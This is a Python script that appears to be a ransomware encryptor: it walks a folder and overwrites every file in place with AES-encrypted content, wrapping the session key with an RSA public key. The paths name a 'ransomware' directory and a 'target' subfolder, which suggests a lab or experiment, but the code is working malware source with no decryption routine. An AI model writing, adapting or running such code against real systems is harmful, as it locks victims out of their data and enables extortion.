from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
import os
import time

def encrypt_file(input_file, public_key):
    with open(input_file, 'rb') as f:
        data = f.read()

    data = bytes(data)

    file=open(public_key,'r')
    pk=file.read()
    key = RSA.import_key(pk)
    session_key = os.urandom(16)

    
    cipher_rsa = PKCS1_OAEP.new(key)
    encrypted_session_key = cipher_rsa.encrypt(session_key)

   
    cipher_aes = AES.new(session_key, AES.MODE_EAX)
    ciphertext, tag = cipher_aes.encrypt_and_digest(data)

    with open(input_file, 'wb') as f:
            for x in (encrypted_session_key, cipher_aes.nonce, tag, ciphertext):
                time.sleep(2)
                f.write(x)
                
    print(f'Encrypted file saved to {input_file}')


def encrypt_files_in_folder(folder_path, public_key_file):
    files = [f for f in os.listdir(folder_path) if os.path.isfile(os.path.join(folder_path, f))]
    for file in files:
        file_path = os.path.join(folder_path, file)
        encrypt_file(file_path, public_key_file)
        


folder_path_to_encrypt = '/home/hk0648/ransomware/target'


public_key_file_path = '/home/hk0648/ransomware/pub_key.pem'

encrypt_files_in_folder(folder_path_to_encrypt, public_key_file_path)
